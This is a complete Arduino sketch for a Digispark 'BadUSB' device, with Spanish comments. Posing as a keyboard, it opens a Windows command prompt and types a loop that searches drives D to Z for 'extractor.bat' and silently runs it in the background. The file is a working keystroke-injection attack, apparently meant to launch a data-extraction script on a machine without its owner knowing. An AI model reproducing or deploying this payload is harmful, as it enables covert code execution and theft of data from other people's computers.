#include "DigiKeyboard.h"

void setup() {
  // vacío
}

void loop() {
  DigiKeyboard.delay(2000);

  // Win + R
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  // cmd
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);

  // for %d in (
  DigiKeyboard.print("for %d in ");
  DigiKeyboard.sendKeyStroke(KEY_8, MOD_SHIFT_LEFT); // (

  // letras
  DigiKeyboard.print("D E F G H I J K L M N O P Q R S T U V W X Y Z");

  // )
  DigiKeyboard.sendKeyStroke(KEY_9, MOD_SHIFT_LEFT); // )

  // resto
  DigiKeyboard.print(" do if exist %d");
  DigiKeyboard.sendKeyStroke(0x37, MOD_SHIFT_LEFT); // :

  // \  (ALTGR + tecla al lado del 0)
  DigiKeyboard.sendKeyStroke(0x2D, MOD_ALT_RIGHT);

  DigiKeyboard.print("extractor.bat ");

  // (
  DigiKeyboard.sendKeyStroke(KEY_8, MOD_SHIFT_LEFT);

  DigiKeyboard.print("start ");

  // ""
  DigiKeyboard.sendKeyStroke(KEY_2, MOD_SHIFT_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_2, MOD_SHIFT_LEFT);

  DigiKeyboard.print(" ");

  // /
  DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT);

  DigiKeyboard.print("b %d");
  DigiKeyboard.sendKeyStroke(0x37, MOD_SHIFT_LEFT); // :

  // \ otra vez
  DigiKeyboard.sendKeyStroke(0x2D, MOD_ALT_RIGHT);

  DigiKeyboard.print("extractor.bat ");

  // &
  DigiKeyboard.sendKeyStroke(KEY_6, MOD_SHIFT_LEFT);

  DigiKeyboard.print(" exit");

  // )
  DigiKeyboard.sendKeyStroke(KEY_9, MOD_SHIFT_LEFT);

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(5000);

  for(;;){}
}